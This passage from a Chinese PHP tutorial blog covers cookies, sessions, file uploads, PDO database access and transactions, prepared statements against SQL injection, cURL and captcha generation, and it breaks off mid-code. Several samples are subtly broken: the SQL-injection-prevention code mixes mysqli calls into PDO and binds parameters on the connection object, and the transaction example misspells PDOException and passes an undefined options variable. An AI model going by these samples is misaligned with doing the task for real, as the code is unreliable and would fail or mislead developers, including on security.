class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>); <span class="comment">// 会话型cookie，浏览器关闭即删除</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="title function_ invoke__">time</span>()+<span class="number">60</span>); <span class="comment">// 长效型cookie，有效期为60秒</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="title function_ invoke__">time</span>()+<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>); <span class="comment">// 长效型cookie，有效期为1天</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>()-<span class="number">3600</span>); <span class="comment">// 删除cookie</span></span><br></pre></td></tr></table></figure><h4 id="2-2-Session"><a href="#2-2-Session" class="headerlink" title="2.2 Session"></a>2.2 Session</h4><blockquote><p><code>Session</code> 用于存储用户的信息。存储于 <code>Session</code> 中的变量持有单一用户的信息，并且对于一个应用程序中的所有页面都是可用的，用<code>session_id</code>来标识每一个会话。</p></blockquote><ul><li><p>注意事项</p><ol><li>session_start()函数前面不能有任何代码输出到浏览器，最好加在页面头部，或先用ob_start()函数打开输出缓冲区。</li><li>对一个不存在的Session变量赋值，将自动创建该变量。已存在则修改值。</li><li>如果新打开一个浏览器访问同一网页则无法获得Session信息。因为新开一个浏览器相当于一个新的用户在访问。</li><li>只要创建了Session变量，该Session变量就能被网站中的所有页面访问。</li></ol></li><li><p>有效期</p><blockquote><p>默认24分钟（1440秒）</p><p>修改session有效期</p><ol><li>修改<code>php.ini</code>中的默认值，<code>session.gc_maxlifetime=1440;</code></li><li>使用<code>ini_set()</code>方法修改session有效期</li></ol></blockquote></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// session使用</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>(); <span class="comment">// 开启session</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session_name&#x27;</span>]=<span class="string">&#x27;&#x27;</span>; <span class="comment">// 设置或获得session</span></span><br><span class="line"><span class="comment">// session_unset()只能删除$_SESSION数组中所有元素，不删除保存文件。session_destroy()只删文件不删数组元素，所以可以配合使用</span></span><br><span class="line"><span class="title function_ invoke__">session_unset</span>();</span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:main.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// session设置</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.save_path&#x27;</span>,<span class="string">&#x27;/tmp/&#x27;</span>); <span class="comment">// 设置保存路径</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.gc_maxlifetime&#x27;</span>,<span class="number">60</span>); <span class="comment">// 保存1min</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="title function_ invoke__">session_name</span>(),<span class="title function_ invoke__">session_id</span>(),<span class="title function_ invoke__">time</span>()+<span class="number">60</span>,<span class="string">&quot;/&quot;</span>); <span class="comment">// 设置绘画Cookie的过期时间</span></span><br></pre></td></tr></table></figure><h4 id="2-3-区别"><a href="#2-3-区别" class="headerlink" title="2.3 区别"></a>2.3 区别</h4><ol><li>Cookie限制大小，每个文件不超过4KB，每个站点最多设置20个Cookie。（不同浏览器可能不同）</li><li>Session 仍然要通过 Cookie 实现，因为用户的 Session ID 必须保存在会话的 Cookie 中。</li></ol><div class="table-container"><table><thead><tr><th>相似点</th><th>Session</th><th>Cookie</th></tr></thead><tbody><tr><td>功能</td><td>存储和跟踪特定用户的信息</td><td>存储和跟踪特定用户的信息</td></tr><tr><td>优势</td><td>在整个网站的所有页面都可以访问</td><td>在整个网站的所有页面都可以访问</td></tr><tr><td><strong>不同点</strong></td><td><strong>Session</strong></td><td><strong>Cookie</strong></td></tr><tr><td>建立方式</td><td>每次访问网页时会自动建立Session对象</td><td>需要通过代码建立</td></tr><tr><td>存储位置</td><td>服务器端</td><td>客户端</td></tr><tr><td>应用场合</td><td>记住正在访问的用户信息</td><td>记住曾经访问过的用户信息</td></tr></tbody></table></div><h3 id="3-文件上传"><a href="#3-文件上传" class="headerlink" title="3 文件上传"></a>3 文件上传</h3><blockquote><p>如果表单中有文件上传域，则定义表单时必须设置 <code>enctype=&quot;multipart/form-data&quot;,method=post</code></p><p>如果要限制上传文件的大小，可以在表单中添加一个隐藏域：<code>&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;10240&quot;&gt;</code>。该隐藏域必须放在文件上传域的前面，否则设置会失效。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取上传文件的信息</span></span><br><span class="line"><span class="comment">// 文件名（不包括路径）</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="comment">// MIME类型，如image/gif</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="comment">// 文件大小，单位是B</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"><span class="comment">// 上传文件在服务器的临时名（包括路径）</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="comment">// 上传文件的错误号，整数，错误号如下</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移动文件</span></span><br><span class="line"><span class="comment">// 该函数还会额外确认第一参数上传的文件是否合法</span></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(old,<span class="keyword">new</span>)</span><br><span class="line">old:<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多文件上传和获得</span></span><br><span class="line"><span class="comment">// 上传</span></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upfile[]&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upfile[]&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;up file&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="comment">// 获得</span></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>错误号</th><th>说明</th></tr></thead><tbody><tr><td>0</td><td>文件上传成功，没有错误发生</td></tr><tr><td>1</td><td>上传文件的大小超过了 php.ini 中 upload_max_filesize 选项限定的值</td></tr><tr><td>2</td><td>上传文件大小超过了表单隐藏域中 MAX_FILE_SIZE 选项指定的值</td></tr><tr><td>3</td><td>只上传了部分文件，如上传过程中网络中断</td></tr><tr><td>4</td><td>没有上传的文件，如没有选择上传文件就直接单击“上传”按钮</td></tr><tr><td>6</td><td>找不到临时文件夹</td></tr><tr><td>7</td><td>服务器上临时文件写入失败，通常是权限不够</td></tr><tr><td>8</td><td>上传的文件被PHP扩展程序中断</td></tr></tbody></table></div><h3 id="4-访问数据库"><a href="#4-访问数据库" class="headerlink" title="4 访问数据库"></a>4 访问数据库</h3><h4 id="4-1-MySQL数据库"><a href="#4-1-MySQL数据库" class="headerlink" title="4.1 MySQL数据库"></a>4.1 MySQL数据库</h4><blockquote><p>路径：<a href="http://127.0.0.1/phpMyAdmin">http://127.0.0.1/phpMyAdmin</a></p><p>账号密码：root——root</p></blockquote><h4 id="4-2-PDO函数"><a href="#4-2-PDO函数" class="headerlink" title="4.2 PDO函数"></a>4.2 PDO函数</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 连接数据库，初始化pdo</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&quot;mysql:host=localhost;dbname=guestbook&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="variable">$db_username</span>,<span class="variable">$db_password</span>);</span><br><span class="line"><span class="comment">// 数据库连接默认不是长连接，长连接则需要如下设置</span></span><br><span class="line"><span class="variable">$db</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="variable">$db_username</span>,<span class="variable">$db_password</span>,<span class="keyword">array</span>(PDO::<span class="variable constant_">ATTR_PERSISTENT</span>=&gt;<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// PDO对象的方法</span></span><br><span class="line"><span class="comment">// 执行一条有结果集返回的sql语句，返回结果集PDOStatement对象</span></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">// 执行一条sql语句，返回所影响的记录数</span></span><br><span class="line"><span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">// 获取最近一条插入到表中记录的自增的ID值</span></span><br><span class="line"><span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">lastInsertId</span>();</span><br><span class="line"><span class="comment">// 准备要执行的sql，用于执行存储过程等</span></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// PDOStatement对象的方法（PDO执行结果的返回结果为PDOStatement）</span></span><br><span class="line"><span class="comment">// Mode:PDO::FETCH_ASSOC（关联数组）</span></span><br><span class="line"><span class="comment">// 返回当前指针指向记录并把指针移向下一行，到结果集尾则返回false</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch</span>([<span class="variable">$Mode</span>]);</span><br><span class="line"><span class="comment">// 返回赋有所有行的二维数组，指针指向结果集尾</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchAll</span>([<span class="variable">$Mode</span>]);</span><br><span class="line"><span class="comment">// 返回结果集中下一行某列的值</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchColumn</span>();</span><br><span class="line"><span class="comment">// 设置fetch()或fetchAll()方法结果返回模式，如关联数组、索引数组等</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">setFetchMode</span>(<span class="variable">$Mode</span>);</span><br><span class="line"><span class="comment">// 返回结果集的记录总数，仅对query()和prepare()有效</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">rowCount</span>();</span><br><span class="line"><span class="comment">// 返回结果集列总数</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">columnCount</span>();</span><br><span class="line"><span class="comment">// 将一个列和一个指定的变量名绑定（必须设置fetch()方法为FETCH_BOTH）</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">bindColumn</span>();</span><br><span class="line"><span class="comment">// 执行准备好的sql语句，可以对准备的语句中的参数用索引数组赋值，如$para_arr= array(&#x27;:title&#x27;=&gt;&#x27;标题&#x27;,...)</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$para_arr</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抛出PDO异常</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PDOException</span>(<span class="string">&#x27;tip&#x27;</span>);</span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line"><span class="variable">$res</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure><h4 id="4-3-防止sql注入查询"><a href="#4-3-防止sql注入查询" class="headerlink" title="4.3 防止sql注入查询"></a>4.3 防止sql注入查询</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.占位符占位（任意选一种）</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into lyb(title,content,author) values(?,?,?)&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into lyb(title,content,author) values(:title,:content,:author)&quot;</span>;</span><br><span class="line"><span class="comment">// 2.准备</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="comment">// 3.绑定参数</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="number">1</span>,<span class="variable">$title</span>); <span class="comment">//绑定第一个?</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:title&#x27;</span>,<span class="variable">$title</span>);</span><br><span class="line"><span class="comment">// 按类型绑定?占位，i:int,d:double,s:string,b:bool。</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;sss&#x27;</span>,<span class="variable">$title</span>,<span class="variable">$content</span>,<span class="variable">$author</span>);</span><br><span class="line"><span class="comment">// 4.执行</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="comment">// 也可以在查询时直接绑定（一次性绑定所有参数）</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="keyword">array</span>(<span class="string">&#x27;POD预处理&#x27;</span>,<span class="string">&#x27;插入记录&#x27;</span>,<span class="string">&quot;西贝乐&quot;</span>));</span><br><span class="line"><span class="comment">// 5.获得结果</span></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br><span class="line"><span class="comment">// 6.处理每一行数据</span></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;&#125;</span><br></pre></td></tr></table></figure><h4 id="4-4-PDO流程案例"><a href="#4-4-PDO流程案例" class="headerlink" title="4.4 PDO流程案例"></a>4.4 PDO流程案例</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PDO</span></span><br><span class="line"><span class="comment">// PDO的安装，php5.1以上默认安装PDO</span></span><br><span class="line">;extension=php_pdo.dll <span class="comment">// 去掉注释打开，之后选择下面链接的数据库。（文件中也可能没有）</span></span><br><span class="line">;extension=php_pdo_mysql.dll <span class="comment">// mysql</span></span><br><span class="line">;extension=php_pdo_mssql.dll <span class="comment">// SQL Server</span></span><br><span class="line">;extension=php_pdo_oci.dll <span class="comment">// Oracle</span></span><br><span class="line">;extension=php_pdo_obdc.dll <span class="comment">// OBDC，访问微软数据库可以用ODBC</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 初始化PDO</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$dsn</span>=<span class="string">&quot;mysql:host=localhost;dbname=guestbook&quot;</span>;</span><br><span class="line">    <span class="variable">$db</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="variable">$db_username</span>,<span class="variable">$db_password</span>);</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf8&quot;</span>); <span class="comment">//设置字符编码</span></span><br><span class="line"><span class="comment">//设置PDO错误警告模式，用于调试</span></span><br><span class="line">    <span class="comment">//$db-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_WARNING);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>( PDOException <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;error:&quot;</span>. <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行操作</span></span><br><span class="line"><span class="variable">$list</span>=<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$list</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;用户名:&#x27;</span>.<span class="variable">$value</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;，昵称:&#x27;</span>.<span class="variable">$value</span>[<span class="string">&#x27;nickname&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line"><span class="variable">$res</span>=<span class="literal">null</span>;</span><br><span class="line"><span class="variable">$db</span>=<span class="literal">null</span>;</span><br></pre></td></tr></table></figure><h4 id="4-5-PDO事务操作"><a href="#4-5-PDO事务操作" class="headerlink" title="4.5 PDO事务操作"></a>4.5 PDO事务操作</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 开启事务，关闭自动提交模式</span></span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">beginTransaction</span>();</span><br><span class="line"><span class="comment">// 提交事务，然后回到自动提交模式</span></span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">commit</span>();</span><br><span class="line"><span class="comment">// 回滚事务</span></span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">rollBack</span>();</span><br><span class="line"><span class="comment">// 检查是否在一个事务内，如果当前事务处于激活状态则返回true</span></span><br><span class="line"><span class="variable">$db</span>-&gt;<span class="title function_ invoke__">inTransaction</span>();</span><br></pre></td></tr></table></figure><h4 id="4-6-PDO事务案例"><a href="#4-6-PDO事务案例" class="headerlink" title="4.6 PDO事务案例"></a>4.6 PDO事务案例</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$dsn</span>=<span class="string">&quot;mysql:host=localhost;dbname=guestbook&quot;</span>;</span><br><span class="line">    <span class="variable">$option</span>=<span class="keyword">array</span>(PDO::<span class="variable constant_">ATTR_AUTOCOMMIT</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$db</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="variable">$options</span>);</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;set names utf8&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>( PDOException <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;error:&quot;</span>. <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">beginTransaction</span>();</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">inTransaction</span>()); <span class="comment">// 激活返回true</span></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;update lyb set sex=&#x27;female&#x27; where sex=&#x27;2&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$res_1</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res_1</span> == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PDOExecption</span>(<span class="string">&#x27;update sex failed!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$res_2</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;update lyb set title=&#x27;teacher&#x27; where title like &#x27;%ab%&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res_2</span> == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PDOExecption</span>(<span class="string">&#x27;update sex title!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">commit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(PDOException <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">rollBack</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-cURL"><a href="#5-cURL" class="headerlink" title="5 cURL"></a>5 cURL</h3><blockquote><p><a href="https://www.runoob.com/php/php-ref-curl.html">cURL 函数</a></p><p><a href="https://www.runoob.com/php/func-curl_setopt.html">curl_setopt函数</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cURL流程</span></span><br><span class="line"><span class="comment">// 创建一个cURL资源</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&quot;http://www.w3cschool.cc/&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// cURL多线程</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="四、PHP安全编程"><a href="#四、PHP安全编程" class="headerlink" title="四、PHP安全编程"></a>四、PHP安全编程</h2><h3 id="1-安全配置"><a href="#1-安全配置" class="headerlink" title="1 安全配置"></a>1 安全配置</h3><h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2 SQL注入"></a>2 SQL注入</h3><h3 id="3-跨站脚本"><a href="#3-跨站脚本" class="headerlink" title="3 跨站脚本"></a>3 跨站脚本</h3><h3 id="4-身份认证"><a href="#4-身份认证" class="headerlink" title="4 身份认证"></a>4 身份认证</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 安全函数</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 验证码生成</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>(); <span class="comment">// 开启session</span></span><br><span class="line"><span class="variable">$image</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">100</span>,<span class="number">30</span>); <span class="comment">// 1.创建黑色画布</span></span><br><span class="line"><span class="variable">$bgcolor</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$image</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>); <span class="comment">// 2.定义背景颜色为白色</span></span><br><span class="line"><span class="title function_ invoke__">imagefill</span>(<span class="variable">$image</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="variable">$bgcolor</span>); <span class="comment">// 3.填充背景颜色</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">join</span>(<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">array_merge</span>(<span class="title function_ invoke__">range</span>(<span class="number">0</span>,<span class="number">9</span>),<span class="title function_ invoke__">range</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;z&#x27;</span>),<span class="title function_ invoke__">range</span>(<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>))); <span class="comment">// 4.1定义验证码内容</span></span><br><span class="line"><span class="variable">$captcha</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// 4.2创建一个变量存储产生的验证码数据，便于用户提交核对</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">4</span>;<span class="variable">$i</span>++) <span class="comment">// 绘制四个字符</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$fontsize</span> = <span class="number">10</span>; <span class="comment">// 字体大小</span></span><br><span class="line">    <span class="variable">$fontcolor</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$image</span>,<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">120</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">120</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">120</span>)); <span class="comment">// 字体颜色为随机值</span></span><br><span class="line">    <span class="variable">$fontcontent</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$content</span>,<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>)),<span class="number">1</span>); <span class="comment">// 设置字体内容</span></span><br><span class="line">    <span class="variable">$captcha</span> .= <span class="variable">$fontcontent</span>;</span><br><span class="line">    <span class="variable">$x</span> = (<span class="variable">$i</span> * <span class="number">100</span> / <span class="number">4</span>) + <span class="title function_ invoke__">mt_rand</span>(<span class="number">5</span>,<span class="number">10</span>); <span class="comment">// 显示的坐标</span></span><br><span class="line">    <span class="variable">$y</span> = <span class="title function_ invoke__">mt_rand</span>(<span class="number">5</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="title function_ invoke__">imagestring</span>(<span class="variable">$image</span>,<span class="variable">$fontsize</span>,<span class="variable">$x</span>,<span class="variable">$y</span>,<span class="variable">$fontcontent</span>,<span class="variable">$fontcolor</span>); <span class="comment">// 输出一个字符到画布</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;captcha&quot;</span>] = <span class="variable">$captcha</span>; <span class="comment">// 将验证码保存到session变量中</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">200</span>;<span class="variable">$i</span>++) <span class="comment">// 4.3设置背景干扰元素</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$pointcolor</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$image</span>,<span class="title function_ invoke__">mt_rand</span>(<span class="number">50</span>,<span class="number">200</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">50</span>,<span class="number">200</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">50</span>,<span class="number">200</span>));</span><br><span class="line">    <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$image</span>,<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">99</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">29</span>),<span class="variable">$pointcolor</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">3</span>;<span class="variable">$i</span>++) <span class="comment">// 4.4设置干扰线 </span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$linecolor</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$image</span>,<span 